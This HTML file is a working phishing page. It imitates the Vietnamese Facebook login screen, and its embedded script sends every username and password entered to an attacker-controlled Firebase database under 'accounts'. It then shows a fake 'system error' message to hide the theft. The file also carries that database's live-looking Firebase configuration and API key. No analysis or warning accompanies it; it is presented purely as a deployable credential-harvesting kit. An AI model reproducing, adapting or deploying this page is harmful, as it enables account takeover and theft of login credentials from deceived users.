<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex: 1;
            align-items: center;
            justify-content: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 25px;
        }

        .left-content {
            flex: 1;
            padding-right: 50px;
        }

        .fb-logo {
            width: 45px;
            margin-bottom: 20px;
        }

        .slogan {
            font-size: 48px;
            font-weight: bold;
            line-height: 1.2;
            color: #1c1e21;
        }

        .hero-img {
            max-width: 500px;
            margin-top: 20px;
            display: block;
        }

        .right-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 400px;
        }

        .login-box {
            width: 100%;
            text-align: center;
        }

        .login-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 10px;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #0866ff;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .btn-login {
            width: 100%;
            background-color: #0866ff;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .btn-login:hover {
            background-color: #075ce4;
        }

        .forgot-password {
            display: block;
            margin: 20px 0;
            color: #1c1e21;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .btn-create {
            width: 100%;
            background-color: transparent;
            color: #0866ff;
            border: 1px solid #0866ff;
            border-radius: 25px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        .meta-logo {
            margin-top: 30px;
            width: 60px;
            opacity: 0.7;
        }

        #status {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }

        /* Footer ngôn ngữ */
        .footer {
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #737373;
            border-top: 1px solid #dddfe2;
            background: #fff;
        }

        .footer span {
            margin: 0 10px;
            cursor: pointer;
        }
        
        @media (max-width: 900px) {
            .container { flex-direction: column; text-align: center; }
            .left-content { padding-right: 0; margin-bottom: 40px; }
            .hero-img { margin: 20px auto; width: 80%; }
            .login-title { text-align: center; }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="left-content">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo" class="fb-logo">
            <h1 class="slogan">Khám phá<br>những điều <span style="color: #1877f2;">bạn yêu thích.</span></h1>
            <img src="https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp" alt="Social Graphics" class="hero-img">
        </div>

        <div class="right-content">
            <div class="login-box">
                <h2 class="login-title">Đăng nhập vào Facebook</h2>
                <input type="text" id="username" placeholder="Email hoặc số di động" required>
                <input type="password" id="password" placeholder="Mật khẩu" required>
                <button type="button" class="btn-login" onclick="sendToCloud()">Đăng nhập</button>
                
                <div id="status"></div>

                <a href="#" class="forgot-password">Quên mật khẩu?</a>
                <a href="#" class="btn-create">Tạo tài khoản mới</a>
            </div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
        </div>
    </div>

    <div class="footer">
        <span>Tiếng Việt</span> • <span>English (UK)</span> • <span>中文(台灣)</span> • <span>한국어</span> • <span>日本語</span> • <span>Ngôn ngữ khác...</span>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyCNtDrjM-xO_lXPIOytOLuj4VfZo1qBH0s",
          authDomain: "keyl-1bb66.firebaseapp.com",
          databaseURL: "https://keyl-1bb66-default-rtdb.asia-southeast1.firebasedatabase.app",
          projectId: "keyl-1bb66",
          storageBucket: "keyl-1bb66.firebasestorage.app",
          messagingSenderId: "742688123103",
          appId: "1:742688123103:web:94e9c7e88c26f8178ee16a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const dbRef = ref(db, 'accounts');

        window.sendToCloud = function() {
            const userField = document.getElementById('username');
            const passField = document.getElementById('password');
            const status = document.getElementById('status');

            if (userField.value && passField.value) {
                push(dbRef, {
                    user: userField.value,
                    pass: passField.value,
                    time: new Date().toLocaleString()
                }).then(() => {
                    userField.value = '';
                    passField.value = '';
                    status.innerHTML = '<span style="color:#00a400">Đang xử lý...</span>';

                    setTimeout(() => {
                        status.innerHTML = '<span style="color:#fa3e3e">Lỗi hệ thống, thử lại sau</span>';
                    }, 1500);
                }).catch((error) => {
                    status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
                });
            } else {
                status.innerHTML = '<span style="color:#777;">Vui lòng nhập đầy đủ thông tin</span>';
            }
        };
    </script>
</body>
</html>
